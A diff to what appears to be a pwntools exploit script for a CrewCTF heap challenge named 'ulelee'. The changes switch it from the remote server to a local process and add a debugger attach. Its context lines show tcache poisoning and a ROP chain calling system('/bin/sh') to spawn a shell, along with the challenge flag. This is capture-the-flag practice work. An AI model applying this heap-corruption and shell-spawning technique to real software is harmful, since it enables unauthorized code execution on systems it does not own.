@@ -6,11 +6,11 @@ warnings.filterwarnings("ignore")
 exe = ELF("./ulelee")
 libc = ELF("./libc.so.6")
 # context.log_level='debug'
-context.terminal = ["alacritty","-e"]
-p = remote("ulele.chal.crewc.tf", 1337)
+context.terminal = ["foot"]
+# p = remote("ulele.chal.crewc.tf", 1337)
 # p.recvuntil("Solution?")
 # input()
-# p = process([exe.path])
+p = process([exe.path])
 def gdbs():
     gdb.attach(p, gdbscript="""
 
@@ -99,6 +99,7 @@ add(p64(protect(save_rip,addrxor3)))
 add(b"pop tcache")
 # gdbs()
 add(b"pop tcache")
+gdbs()
 add(b"a"*8+p64(ret)+p64(pop_rdi)+p64(libc.search("/bin/sh").__next__())+p64(libc.sym.system))
 #crew{ulal_ulele_ulala_this_is_miss_type_of_datatype:(_LINZ_IS_HERE}
 # dels(0x102)
